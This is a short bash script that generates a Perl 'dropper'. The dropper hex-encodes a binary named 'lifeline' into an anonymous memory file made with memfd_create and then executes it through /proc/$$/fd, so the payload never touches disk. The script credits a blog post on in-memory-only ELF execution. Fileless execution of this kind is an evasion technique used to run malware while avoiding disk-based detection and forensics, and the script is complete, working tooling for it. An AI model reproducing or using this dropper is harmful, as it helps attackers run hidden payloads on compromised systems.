#!/bin/bash

# Huge thanks to @MagisterQuis blog post
# https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html


# Usage: ./make_perl_dropper.sh [number of lifelines]

NUM=1

if [ ! -z "$1" ] ; then
	NUM=$1
fi


mkdir -p ../build

# First setup a temp file in memory
echo "
my \$name = '';
my \$fd = syscall(319, \$name, 1);
if (-1 == \$fd) {
        die \"memfd_create: \$!\";
}

open(my \$FH, '>&='.\$fd) or die \"open: \$!\";
select((select(\$FH), $|=1)[0]);

" > ../build/dropper.pl

# Then convert the entire binary to perl printf calls, to be written to the temp file
perl -e '$/=\32;print"print \$FH pack q/H*/, q/".(unpack"H*")."/\ or die qq/write: \$!/;\n"while(<>)' ../build/lifeline >> ../build/dropper.pl

# Exec into the binary
echo "
exec \"/proc/\$\$/fd/\$fd\", \"$NUM\" or die \"exec: \$!\";" >> ../build/dropper.pl
